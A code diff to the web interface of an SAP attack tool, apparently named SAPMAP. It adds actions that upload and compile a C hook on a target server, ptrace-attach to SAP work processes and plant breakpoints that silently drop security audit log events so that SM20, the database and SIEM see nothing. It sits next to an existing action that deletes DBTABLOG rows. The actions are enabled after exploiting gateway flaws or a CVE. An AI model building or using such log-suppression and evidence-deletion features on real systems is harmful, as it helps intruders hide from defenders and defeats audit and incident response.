@@ -1186,6 +1186,12 @@ body {
       <div class="ctx-item" data-action="tier3_dbtablog_purge"
            title="Tier 3 MUTATION (ABAP). Captures MAX(LOGID) baseline on DBTABLOG, waits hold_seconds, then DELETEs every row written after that point (optional TABNAME whitelist). DBTABLOG is delivery class L (not itself logged) — the DELETE does not recurse. No DD09L touch, no DDIC activation, no transport object. Requires RFC_ABAP_INSTALL_AND_RUN."
            >&#129529; Purge DBTABLOG... (Tier 3 mutation)</div>
+      <div class="ctx-item" data-action="tier3_sal_death_star_launch"
+           title="Tier 3 MUTATION (Linux). Virtual SAP Death Star (Julian Petersohn / @randomstr1ng). Uploads sap_audit_hook.c to /tmp, compiles as <sid>adm, ptrace-attaches to a disp+work worker, plants INT3 breakpoints on the three SAL sinks (fwrite×2 + write_event_to_DB + EtdSendEvent). In --suppress mode audit records matching the filter are silently dropped in-memory — SM20 shows nothing, no disk write, no DB row, no ETD/SIEM. Persists as a background process until Disarm. Requires Linux + <sid>adm + kernel.yama.ptrace_scope <= 1. Not a 0-day — SAP publicly confirmed this is post-exploitation."
+           >&#127770; Arm Virtual SAP Death Star... (Tier 3 mutation)</div>
+      <div class="ctx-item" data-action="tier3_sal_death_star_stop"
+           title="Tier 3 disarm. SIGTERM the running sap_audit_hook. Its signal handler runs detach_all() which restores every INT3 byte in the target disp+work text segment and releases ptrace cleanly. Idempotent — safe to click even when nothing is running."
+           >&#10071; Disarm Virtual SAP Death Star (Tier 3 disarm)</div>
     </div>
   </div>
   <!-- Data Extraction submenu -->
@@ -4472,6 +4478,19 @@ function showCtxMenu(e, sid) {
         && !!(mapState.evasion && mapState.evasion.allow_evasion),
     'tier3_dbtablog_purge': hasUsableAbapAccess
         && !!(mapState.evasion && mapState.evasion.allow_evasion),
+    // Virtual SAP Death Star — Linux-only (Julian Petersohn's C hook
+    // uses process_vm_readv + PTRACE_ATTACH + /proc/<pid>/exe).
+    // Needs an OS-exec channel to upload + compile + launch the hook
+    // as <sid>adm.  Arm requires a captured baseline (documentation +
+    // audit trail) even though the C hook restores its own INT3 bytes;
+    // Disarm skips baseline gating so operators can clean up even if
+    // baseline metadata was lost mid-run.
+    'tier3_sal_death_star_launch': !isWindows
+        && (hasGwVuln || hasCve31324 || hasCreatedUsers || hasSapControlOsExec)
+        && !!(mapState.evasion && mapState.evasion.allow_evasion)
+        && !!(mapState.evasion && mapState.evasion.baseline_captured_at),
+    'tier3_sal_death_star_stop': !isWindows
+        && !!(mapState.evasion && mapState.evasion.allow_evasion),
     'retrieve_rfcs':    hasUsableAbapAccess,        // ABAP-only RFC + BAPI
     'test_rfcs':        hasUsableAbapAccess && hasRFCs,
     'read_java_destinations': isJavaStack && (hasCve31324 || hasGwVuln || hasJavaDeploy),
@@ -4711,6 +4730,20 @@ function showCtxMenu(e, sid) {
         ((mapState.evasion && mapState.evasion.allow_evasion)
          ? 'DELETES rows from DBTABLOG. Captures MAX(LOGID) baseline, sleeps hold_seconds (operator runs actions during this window — all table-logged DML lands in DBTABLOG normally), then DELETEs every row with LOGID > baseline (optionally narrowed by TABNAME whitelist). DBTABLOG is delivery class L (not itself logged) — DELETE does not recurse. No DD09L touch, no DDIC reactivation, no transport object. Self-managed baseline.'
          : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).'),
+    'tier3_sal_death_star_launch':
+        (isWindows
+         ? 'Windows kernel target — the C hook uses process_vm_readv + PTRACE_ATTACH which are Linux-only. Not supported on this OS.'
+         : ((mapState.evasion && mapState.evasion.allow_evasion)
+            ? ((mapState.evasion && mapState.evasion.baseline_captured_at)
+               ? 'MUTATES disp+work in-memory. Uploads Julian Petersohn\'s sap_audit_hook.c to /tmp, compiles as <sid>adm, picks a dialog worker PID and ptrace-attaches. Plants INT3 breakpoints on the two fwrite calls, write_event_to_DB, and the three EtdSender calls in rsauwr1ex. In --suppress mode audit records matching the filter (or all events when empty) are silently dropped — SM20 never sees them, no disk write, no DB row, no ETD/SIEM. Persists as a background process on the target until Disarm. Requires Linux + <sid>adm + kernel.yama.ptrace_scope <= 1. Not a 0-day — SAP publicly confirmed this is post-exploitation.'
+               : 'Tier 3 armed but no baseline captured yet — run "Capture Evasion Baseline" on this node first.')
+            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
+    'tier3_sal_death_star_stop':
+        (isWindows
+         ? 'Windows target — no Linux ptrace hook was armed here.'
+         : ((mapState.evasion && mapState.evasion.allow_evasion)
+            ? 'SIGTERM the running sap_audit_hook. The hook\'s signal handler calls detach_all() which restores every INT3 byte in the target disp+work text segment and releases ptrace cleanly before exiting. Idempotent — safe to click even when nothing is running.'
+            : 'Tier 3 not armed — restart SAPMAP with --allow-evasion (see disclaimer banner).')),
     'retrieve_rfcs':    'Needs a verified RFC credential or a SAPMAP-created user — RSRFCCHK and the RFCDES read both require a working logon.',
     'test_rfcs':        (!hasRFCs
         ? 'Retrieve RFC connections first.'
@@ -4815,6 +4848,9 @@ function showCtxMenu(e, sid) {
     'tier3_sal_uname_narrow': !isAbapStack,
     'tier3_java_sal_suppress': !isJavaStack,
     'tier3_dbtablog_purge': !isAbapStack,
+    // Death Star C hook uses Linux ptrace/procfs — hide on Windows targets.
+    'tier3_sal_death_star_launch': isWindows,
+    'tier3_sal_death_star_stop': isWindows,
     'retrieve_rfcs':    !isAbapStack,
     'test_rfcs':        !isAbapStack,
     'create_tcpip':          !isAbapStack,
@@ -6342,6 +6378,70 @@ async function ctxAction(action) {
       }, 1000);
       break;
     }
+    case 'tier3_sal_death_star_launch': {
+      // Virtual SAP Death Star — Julian Petersohn's ptrace-based
+      // in-memory SAL suppressor.  Two-step confirm because this
+      // *plants INT3 bytes into the live disp+work text segment*.
+      // A crash before the paired disarm would leave breakpoints
+      // patched into the running kernel — the SIGTERM handler
+      // restores cleanly, SIGKILL doesn't.
+      const dsFilterRaw = prompt(
+        'Tier 3: Arm Virtual SAP Death Star on ' + sid + '\n\n'
+        + 'This uploads Julian Petersohn\'s sap_audit_hook.c to /tmp\n'
+        + 'on the target, compiles as <sid>adm, picks a disp+work\n'
+        + 'worker PID, and ptrace-attaches. INT3 breakpoints go into\n'
+        + 'the three SAL sinks (fwrite×2 + write_event_to_DB + ETD).\n'
+        + '\n'
+        + 'Suppress filter — comma-separated event classes to drop.\n'
+        + '  Empty  = suppress EVERYTHING the hook sees\n'
+        + '  AUW    = only successful logons\n'
+        + '  AUW,AU3,EUP = several classes\n'
+        + '\n'
+        + 'Requires: Linux + <sid>adm shell + ptrace_scope <= 1',
+        'AUW');
+      // Null = cancelled; empty string = "suppress all".
+      if (dsFilterRaw === null) break;
+      const dsFilter = dsFilterRaw.trim();
+      const dsPidRaw = prompt(
+        'Target work-process PID?\n\n'
+        + 'Leave EMPTY to auto-pick the first _W<n> worker.\n'
+        + 'Or paste a specific PID (from ps -eo pid,comm,args on the\n'
+        + 'target) to force a particular disp+work process.',
+        '');
+      if (dsPidRaw === null) break;
+      const dsPid = dsPidRaw.trim() ? parseInt(dsPidRaw, 10) : null;
+      if (dsPidRaw.trim() && (isNaN(dsPid) || dsPid <= 0)) {
+        showToast('PID must be a positive integer', 'warning');
+        break;
+      }
+      if (!confirm(
+        'ARM the Virtual SAP Death Star on ' + sid + '?\n\n'
+        + 'Filter:   ' + (dsFilter || '(all SAL classes)') + '\n'
+        + 'Target:   ' + (dsPid ? 'PID ' + dsPid : 'auto-pick worker') + '\n'
+        + 'Method:   ptrace INT3 hook in disp+work rsauwr1ex\n'
+        + 'Persist:  background process on target until Disarm\n'
+        + '\n'
+        + '⚠ INT3 bytes are planted into live disp+work code. If the\n'
+        + '  hook is SIGKILL\'d instead of SIGTERM\'d, the bytes stay\n'
+        + '  patched and the work process will trap on next SAL write.\n'
+        + '  Use the Disarm action to stop cleanly.')) break;
+      flashActivity(
+        `${sid}: Death Star — uploading + compiling + arming...`,
+        6000);
+      await api('POST', `node/${sid}/tier3_sal_death_star_launch`,
+                 {filter_classes: dsFilter,
+                  target_pid: dsPid});
+      break;
+    }
+    case 'tier3_sal_death_star_stop':
+      // Disarm — SIGTERM the hook.  No confirm; disarm is always
+      // safe (idempotent), and the whole point of the button is
+      // quick cleanup.
+      flashActivity(
+        `${sid}: Death Star — disarming (SIGTERM + INT3 restore)...`,
+        4000);
+      await api('POST', `node/${sid}/tier3_sal_death_star_stop`);
+      break;
     case 'retrieve_rfcs':
       await api('POST', `node/${sid}/retrieve_rfcs`); break;
     case 'test_rfcs':
